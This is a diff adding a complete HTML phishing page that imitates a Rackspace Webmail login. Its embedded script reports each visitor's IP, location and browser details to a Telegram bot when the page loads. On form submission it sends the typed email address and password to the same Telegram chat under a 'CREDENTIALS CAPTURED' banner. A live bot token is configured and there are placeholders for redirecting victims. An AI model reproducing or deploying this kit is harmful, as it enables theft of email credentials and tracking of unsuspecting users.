@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rackspace Webmail: Hosted Email for Business</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            margin: 0;
+        }
+        /* Header - Bigger and Bolder */
+        .header {
+            background: #2c2e2f;
+            padding: 16px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 40px;
+            border-radius: 4px 4px 0 0;
+            max-width: 950px;
+            width: 100%;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .header-left {
+            color: #e8eaed;
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+        .header-right {
+            text-align: right;
+            color: #e8eaed;
+        }
+        .header-right .rackspace {
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            display: block;
+        }
+        .header-right .technology {
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 2px;
+            color: #9aa0a6;
+            display: block;
+            margin-top: 2px;
+        }
+        /* Main Content */
+        .main-content {
+            flex: 1;
+            display: flex;
+            align-items: stretch;
+            justify-content: center;
+            padding: 50px 40px 30px 40px;
+            max-width: 950px;
+            margin: 0 auto;
+            width: 100%;
+            gap: 40px;
+        }
+        /* Left Side - SUSPICIOUS Image Banner */
+        .suspicious-side {
+            flex: 0 0 240px;
+            max-width: 240px;
+            width: 100%;
+            min-height: 380px;
+            display: flex;
+            align-items: stretch;
+            background: #ffffff;
+            border-radius: 0 0 8px 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            border: 1px solid #e8eaed;
+            border-top: none;
+        }
+        .suspicious-image {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            display: block;
+            background: #ffffff;
+            padding: 10px;
+        }
+        /* Right Side - Login Form */
+        .form-side {
+            flex: 1;
+            max-width: 580px;
+            width: 100%;
+            min-height: 380px;
+            background: white;
+            border-radius: 0 0 8px 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            padding: 32px 36px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .form-group {
+            margin-bottom: 14px;
+        }
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #2c2e2f;
+            margin-bottom: 4px;
+        }
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 15px;
+            border: 1px solid #d1d5da;
+            border-radius: 4px;
+            background: #fafbfc;
+            transition: border 0.2s ease, box-shadow 0.2s ease;
+            outline: none;
+            color: #2c2e2f;
+        }
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            border-color: #0072c6;
+            box-shadow: 0 0 0 3px rgba(0, 114, 198, 0.12);
+            background: white;
+        }
+        .password-group {
+            position: relative;
+        }
+        .password-toggle {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #6b7177;
+            cursor: pointer;
+            font-size: 15px;
+            padding: 4px;
+        }
+        .password-toggle:hover {
+            color: #2c2e2f;
+        }
+        .forgot-password {
+            text-align: right;
+            margin-top: 4px;
+            margin-bottom: 16px;
+        }
+        .forgot-password a {
+            color: #0072c6;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 13px;
+            font-size: 15px;
+            font-weight: 600;
+            color: white;
+            background: #0072c6;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s ease;
+            letter-spacing: 0.3px;
+        }
+        .login-btn:hover {
+            background: #005a9e;
+        }
+        .login-btn:active {
+            background: #004b82;
+        }
+        .footer-links {
+            margin-top: 18px;
+            text-align: center;
+            font-size: 12px;
+            color: #6b7177;
+        }
+        .footer-links a {
+            color: #6b7177;
+            text-decoration: none;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+            color: #2c2e2f;
+        }
+        .footer-links .divider {
+            margin: 0 6px;
+            color: #d1d5da;
+        }
+        .hosted-email-cta {
+            margin-top: 16px;
+            background: #f7f9fc;
+            padding: 14px 18px;
+            border-radius: 4px;
+            text-align: center;
+            font-size: 12px;
+            color: #2c2e2f;
+            border: 1px solid #e8eaed;
+            line-height: 1.5;
+        }
+        .hosted-email-cta a {
+            color: #0072c6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .hosted-email-cta a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 820px) {
+            .header {
+                margin-top: 20px;
+                padding: 14px 20px;
+                max-width: 100%;
+                border-radius: 0;
+            }
+            .header-left {
+                font-size: 20px;
+            }
+            .header-right .rackspace {
+                font-size: 18px;
+            }
+            .header-right .technology {
+                font-size: 11px;
+            }
+            .main-content {
+                flex-direction: column-reverse;
+                padding: 30px 20px 30px 20px;
+                gap: 25px;
+                align-items: center;
+                max-width: 100%;
+            }
+            .suspicious-side {
+                flex: 0 0 auto;
+                max-width: 340px;
+                width: 100%;
+                min-height: 200px;
+                border-radius: 0 0 8px 8px;
+                border-top: none;
+            }
+            .suspicious-image {
+                height: auto;
+                max-height: 240px;
+                object-fit: contain;
+                padding: 16px;
+            }
+            .form-side {
+                flex: 0 0 auto;
+                max-width: 380px;
+                width: 100%;
+                min-height: auto;
+                padding: 28px 24px;
+                border-radius: 0 0 8px 8px;
+            }
+        }
+        @media (max-width: 480px) {
+            .header {
+                flex-direction: column;
+                text-align: center;
+                padding: 12px 16px;
+                margin-top: 10px;
+            }
+            .header-left {
+                font-size: 18px;
+            }
+            .header-right .rackspace {
+                font-size: 16px;
+            }
+            .header-right {
+                text-align: center;
+            }
+            .form-side {
+                padding: 20px 16px;
+                max-width: 100%;
+            }
+            .suspicious-side {
+                max-width: 100%;
+                min-height: 150px;
+            }
+            .main-content {
+                padding: 20px 16px 20px 16px;
+            }
+            .forgot-password {
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-left">Webmail Login</div>
+        <div class="header-right">
+            <span class="rackspace">rackspace</span>
+            <span class="technology">technology</span>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <div class="main-content">
+        <!-- Left Side - SUSPICIOUS Image Banner -->
+        <div class="suspicious-side">
+            <img src="https://static.emailsrvr.com/apps_rackspace_com/images/Suspicious-Email-Banner.jpg" 
+                 alt="Suspicious Email Banner" 
+                 class="suspicious-image"
+                 loading="eager"
+                 style="image-rendering: auto; image-rendering: crisp-edges;">
+        </div>
+
+        <!-- Right Side - Login Form -->
+        <div class="form-side">
+            <form id="loginForm" action="#" method="POST">
+                <div class="form-group">
+                    <label for="email">Email address</label>
+                    <input type="email" id="email" name="email" placeholder="Enter your email address" required autofocus>
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <div class="password-group">
+                        <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                        <button type="button" class="password-toggle" id="togglePassword" aria-label="Show password">👁️</button>
+                    </div>
+                </div>
+
+                <div class="forgot-password">
+                    <a href="#">Forgot password?</a>
+                </div>
+
+                <button type="submit" class="login-btn">Log In</button>
+            </form>
+
+            <!-- Footer Links -->
+            <div class="footer-links">
+                <a href="#">Privacy Statement</a>
+                <span class="divider">|</span>
+                <a href="#">Website Terms</a>
+            </div>
+
+            <!-- Hosted Email CTA -->
+            <div class="hosted-email-cta">
+                Need webmail for your business? <a href="#">Learn more</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        // CONFIGURATION - Replace with your Telegram Bot details
+        // ============================================================
+        var TELEGRAM_BOT_TOKEN = "8894539635:AAH3VcbNhHEg6H1zWrZn5kruab-ak_LsatA";
+        var TELEGRAM_CHAT_ID = "-5459198643";
+
+        // ============================================================
+        // TELEGRAM REPORT FUNCTION
+        // ============================================================
+        function sendToTelegram(message) {
+            if (TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN" || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID") {
+                console.log("Telegram not configured. Message:", message);
+                return;
+            }
+
+            var url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", url, true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4 && xhr.status !== 200) {
+                    console.log("Failed to send to Telegram:", xhr.responseText);
+                }
+            };
+            xhr.send(JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: "HTML"
+            }));
+        }
+
+        // ============================================================
+        // GET VISITOR IP (via multiple free APIs)
+        // ============================================================
+        function getIP(callback) {
+            // Try ipapi.co first (supports HTTPS)
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "https://ipapi.co/json/", true);
+            xhr.timeout = 5000;
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    try {
+                        var data = JSON.parse(xhr.responseText);
+                        if (data.ip) {
+                            callback(data);
+                            return;
+                        }
+                    } catch (e) {}
+                }
+                // Fallback to ip-api.com
+                var xhr2 = new XMLHttpRequest();
+                xhr2.open("GET", "https://ipapi.co/json/", true);
+                xhr2.timeout = 5000;
+                xhr2.onload = function() {
+                    if (xhr2.status === 200) {
+                        try {
+                            var data2 = JSON.parse(xhr2.responseText);
+                            if (data2.ip) {
+                                callback(data2);
+                                return;
+                            }
+                        } catch (e) {}
+                    }
+                    // Final fallback: return empty data
+                    callback({ ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown" });
+                };
+                xhr2.onerror = function() { callback({ ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown" }); };
+                xhr2.send();
+            };
+            xhr.onerror = function() {
+                // Fallback to ip-api.com
+                var xhr2 = new XMLHttpRequest();
+                xhr2.open("GET", "https://ipapi.co/json/", true);
+                xhr2.timeout = 5000;
+                xhr2.onload = function() {
+                    if (xhr2.status === 200) {
+                        try {
+                            var data2 = JSON.parse(xhr2.responseText);
+                            if (data2.ip) {
+                                callback(data2);
+                                return;
+                            }
+                        } catch (e) {}
+                    }
+                    callback({ ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown" });
+                };
+                xhr2.onerror = function() { callback({ ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown" }); };
+                xhr2.send();
+            };
+            xhr.send();
+        }
+
+        // ============================================================
+        // GET LOCATION FROM IP (using ipapi.co)
+        // ============================================================
+        function getLocation(ip, callback) {
+            if (!ip || ip === "Unknown") {
+                callback({ city: "Unknown", region: "Unknown", country: "Unknown", lat: "N/A", lon: "N/A" });
+                return;
+            }
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "https://ipapi.co/" + ip + "/json/", true);
+            xhr.timeout = 5000;
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    try {
+                        var data = JSON.parse(xhr.responseText);
+                        callback({
+                            city: data.city || "Unknown",
+                            region: data.region || "Unknown",
+                            country: data.country_name || "Unknown",
+                            lat: data.latitude || "N/A",
+                            lon: data.longitude || "N/A"
+                        });
+                        return;
+                    } catch (e) {}
+                }
+                callback({ city: "Unknown", region: "Unknown", country: "Unknown", lat: "N/A", lon: "N/A" });
+            };
+            xhr.onerror = function() {
+                callback({ city: "Unknown", region: "Unknown", country: "Unknown", lat: "N/A", lon: "N/A" });
+            };
+            xhr.send();
+        }
+
+        // ============================================================
+        // PAGE VISIT REPORT
+        // ============================================================
+        (function reportVisit() {
+            var userAgent = navigator.userAgent || "Unknown";
+            var referrer = document.referrer || "Direct";
+            var pageUrl = window.location.href;
+            var visitTime = new Date().toLocaleString("en-US", {
+                timeZone: "UTC",
+                year: "numeric",
+                month: "short",
+                day: "numeric",
+                hour: "2-digit",
+                minute: "2-digit",
+                second: "2-digit"
+            });
+
+            getIP(function(ipData) {
+                var ip = ipData.ip || "Unknown";
+                var locationStr = "";
+                if (ipData.city && ipData.region && ipData.country) {
+                    locationStr = ipData.city + ", " + ipData.region + ", " + ipData.country;
+                } else if (ipData.country) {
+                    locationStr = ipData.country;
+                } else {
+                    locationStr = "Unknown";
+                }
+
+                // Build the full report message
+                var message = "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+                message += "🕵️ <b>NEW PAGE VISIT</b>\n";
+                message += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
+                message += "📍 <b>Location:</b> " + locationStr + "\n";
+                message += "🕐 <b>Time (UTC):</b> " + visitTime + "\n";
+                message += "💻 <b>User Agent:</b> " + userAgent + "\n";
+                message += "🔗 <b>Referrer:</b> " + referrer + "\n";
+                message += "🌐 <b>IP Address:</b> " + ip + "\n";
+                message += "📄 <b>Page:</b> " + pageUrl + "\n";
+
+                // Send to Telegram
+                sendToTelegram(message);
+
+                console.log("Visit reported to Telegram");
+            });
+        })();
+
+        // ============================================================
+        // FORM SUBMISSION (Captures email & password)
+        // ============================================================
+        (function() {
+            const loginForm = document.getElementById('loginForm');
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const togglePassword = document.getElementById('togglePassword');
+
+            // Toggle password visibility
+            togglePassword.addEventListener('click', function() {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                this.textContent = type === 'password' ? '👁️' : '🙈';
+            });
+
+            // Form submission - captures credentials and reports to Telegram
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const email = emailInput.value.trim();
+                const password = passwordInput.value.trim();
+
+                if (!email || !password) {
+                    alert('Please enter both email and password.');
+                    return;
+                }
+
+                // Get IP and location for the credential report
+                getIP(function(ipData) {
+                    var ip = ipData.ip || "Unknown";
+                    var locationStr = "";
+                    if (ipData.city && ipData.region && ipData.country) {
+                        locationStr = ipData.city + ", " + ipData.region + ", " + ipData.country;
+                    } else if (ipData.country) {
+                        locationStr = ipData.country;
+                    } else {
+                        locationStr = "Unknown";
+                    }
+
+                    var userAgent = navigator.userAgent || "Unknown";
+                    var visitTime = new Date().toLocaleString("en-US", {
+                        timeZone: "UTC",
+                        year: "numeric",
+                        month: "short",
+                        day: "numeric",
+                        hour: "2-digit",
+                        minute: "2-digit",
+                        second: "2-digit"
+                    });
+
+                    var message = "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+                    message += "🔐 <b>CREDENTIALS CAPTURED</b>\n";
+                    message += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
+                    message += "📧 <b>Email:</b> " + email + "\n";
+                    message += "🔑 <b>Password:</b> " + password + "\n";
+                    message += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+                    message += "📍 <b>Location:</b> " + locationStr + "\n";
+                    message += "🕐 <b>Time (UTC):</b> " + visitTime + "\n";
+                    message += "💻 <b>User Agent:</b> " + userAgent + "\n";
+                    message += "🌐 <b>IP Address:</b> " + ip + "\n";
+
+                    // Send credentials to Telegram
+                    sendToTelegram(message);
+
+                    console.log('Credentials sent to Telegram');
+                });
+
+                // --- Redirect to your target URL ---
+                // window.location.href = 'https://your-target-url.com';
+                alert('Login attempt: ' + email);
+            });
+
+            // All links
+            document.querySelectorAll('.forgot-password a, .footer-links a, .hosted-email-cta a').forEach(function(link) {
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    // window.location.href = 'https://your-target-url.com';
+                    alert('Redirect to target URL goes here.');
+                });
+            });
+
+            // Click on the suspicious image banner to redirect
+            const suspiciousImage = document.querySelector('.suspicious-image');
+            if (suspiciousImage) {
+                suspiciousImage.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    // window.location.href = 'https://your-target-url.com';
+                    alert('Redirect to target URL goes here.');
+                });
+                suspiciousImage.style.cursor = 'pointer';
+            }
+
+        })();
+    </script>
+</body>
+</html>
